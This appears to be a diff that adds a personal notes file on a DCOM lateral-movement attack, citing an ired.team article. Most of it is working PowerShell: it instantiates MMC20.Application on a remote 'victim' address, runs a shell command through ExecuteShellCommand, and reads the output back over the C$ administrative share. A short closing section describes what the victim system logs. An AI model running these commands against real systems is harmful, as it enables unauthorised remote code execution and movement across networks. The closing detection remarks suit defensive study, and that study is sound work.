@@ -1,0 +1,35 @@
+DCOM attack
+https://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model
+
+
+
+MMC20.Application.1 COM Class always has the same value in registery
+49B2791A-B1AE-4C90-9B8E-E860BA07F889
+
+To get it, use:
+Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
+
+To establish a connection to the victim, do the following:
+$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.240.192.60"))
+
+To execute a command on the victim: (This will save the output to the file 'temp\test.txt')
+$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\temp\test.txt","7")
+
+To get what was executed:
+Get-Content \\10.240.192.60\C$\temp\test.txt
+
+
+Once the connection from an attacker to victim is established using the below powershell:
+[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.240.192.60"))
+
+This is what happens on the victim system - svchost spawns mmc.exe which opens a listening port via RPC binding
+
+A network connection is logged from 10.0.0.7 (attacker) to 10.0.0.2 (victim) via the user used
+
+
+
+
+
+
+
+
